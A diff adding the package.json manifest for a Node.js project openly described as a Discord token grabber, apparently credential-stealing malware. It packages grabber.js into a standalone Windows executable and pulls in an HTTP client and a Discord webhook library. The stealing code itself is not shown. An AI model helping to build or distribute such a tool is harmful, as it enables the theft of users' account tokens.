@@ -1,0 +1,32 @@
+{
+  "name": "token-grabber",
+  "version": "1.0.0",
+  "description": "Token Grabber for Discord.",
+  "main": "grabber.js",
+  "bin": "grabber.js",
+  "pkg": {
+    "targets": [
+      "node17-win-x64"
+    ],
+    "assets": [
+      "/**/*"
+    ]
+  },
+  "dependencies": {
+    "axios": "^0.26.0",
+    "discord-webhook-node": "^1.1.8"
+  },
+  "devDependencies": {
+    "@types/axios": "^0.14.0",
+    "pkg": "^5.5.2"
+  },
+  "scripts": {
+    "build": "pkg ."
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/deliever42/discord-token-grabber.git"
+  },
+  "author": "deliever",
+  "license": "Apache-2.0"
+}
